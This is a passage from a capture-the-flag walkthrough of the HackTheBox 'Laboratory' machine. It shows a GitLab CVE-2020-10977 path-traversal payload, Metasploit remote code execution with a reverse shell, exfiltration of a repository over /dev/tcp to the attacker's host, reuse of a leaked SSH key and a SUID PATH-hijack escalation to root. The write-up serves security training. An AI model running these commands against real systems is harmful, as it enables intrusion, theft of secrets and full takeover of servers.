+<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
+</p>
+<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
+</p>
+<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
+<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
+</p>
+<p>The payload will then turn into an attached file.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
+</p>
+<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
+</p>
+<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
+<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
+
+...&lt;SNIP&gt;...
+<span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
+<span class="o">[</span>+<span class="o">]</span> Username      : iamf
+<span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
+<span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
+
+<span class="o">[</span>!<span class="o">]</span> Trying to Login...
+<span class="o">[</span>+<span class="o">]</span> Login Successful!
+<span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
+<span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
+<span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
+<span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
+<span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
+<span class="o">[</span>!<span class="o">]</span> Creating an Issue...
+<span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
+<span class="o">[</span>!<span class="o">]</span> Moving Issue...
+<span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
+<span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
+
+&gt; /etc/passwd
+----------------------------------------
+
+...&lt;SNIP&gt;...
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
+<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
+<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
+<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
+</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ msfdb reinit
+<span class="o">[</span>+<span class="o">]</span> Starting database
+<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+<span class="o">[</span>+<span class="o">]</span> Stopping database
+<span class="o">[</span>+<span class="o">]</span> Starting database
+<span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating initial database schema
+</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
+<span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
+</code></pre></div><p>Below are the options needed by the module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
+<span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
+<span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
+<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
+<span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
+<span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
+<span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
+<span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
+</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
+<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
+<span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
+<span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
+<span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
+<span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+<span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
+<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
+
+id<span class="p">;</span>hostname
+<span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
+git.laboratory.htb
+</code></pre></div><p>I have shell as user <code>git</code>.</p>
+<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">ls -la /
+total <span class="m">88</span>
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
+-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
+-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
+drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-dexter">Shell as dexter</h3>
+<h4 id="container-enumeration">Container enumeration</h4>
+<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~$ grep -Ri dexter 2&gt;/dev/null
+
+git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
+git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
+</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+total <span class="m">40</span>
+drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
+drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
+-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
+-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
+-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
+drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
+drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
+-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
+drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
+drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
+</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
+</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
+</code></pre></div><p>My listener received the tarball.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
+</code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
+<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ tar -xzf exfil-securedocker-git.tar
+→ root@iamf «loot» «10.10.14.39»
+$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
+→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ 
+</code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><blockquote>
+<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
+</blockquote>
+<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ mkdir .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ mv * .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git init
+Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ git status
+On branch master
+Changes to be committed:
+  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
+        deleted:    README.md
+        deleted:    create_gitlab.sh
+        deleted:    dexter/.ssh/authorized_keys
+        deleted:    dexter/.ssh/id_rsa
+        deleted:    dexter/recipe.url
+        deleted:    dexter/todo.txt
+</code></pre></div><p>Interestingly, this repository contains a set of SSH keys. I can restore the deleted files with <code>git checkout --</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ git checkout --
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ls -la
+total <span class="m">20</span>
+drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
+drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
+</code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
+<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
+<p>At first try, it says the key is invalid format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
+Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
+dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
+</code></pre></div><p>I fixed that by adding an empty string (newline) using the <code>echo</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
+</code></pre></div><p>Now it logs me in.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ssh -i id_rsa dexter@10.10.10.216
+dexter@laboratory:~$
+dexter@laboratory:~$ id<span class="p">;</span>hostname
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
+laboratory
+dexter@laboratory:~$ ls -l
+total <span class="m">4</span>
+-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ cat dexter/todo.txt
+<span class="c1"># DONE: Secure docker for regular users</span>
+<span class="c1">### DONE: Automate docker security on startup</span>
+<span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
+<span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
+</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+
+<span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
+-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
+</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ ltrace docker-security 
+
+setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
+setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
+system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
+system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
+<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
+<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
+dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
+</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ which chmod
+/dev/shm/chmod
+</code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ docker-security 
+root@laboratory:/dev/shm#
+root@laboratory:/dev/shm# cut -c6- /root/root.txt 
+9f593f335a0a1f403c753719eb6
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
 </ul>
 ]]></content:encoded>
     </item>
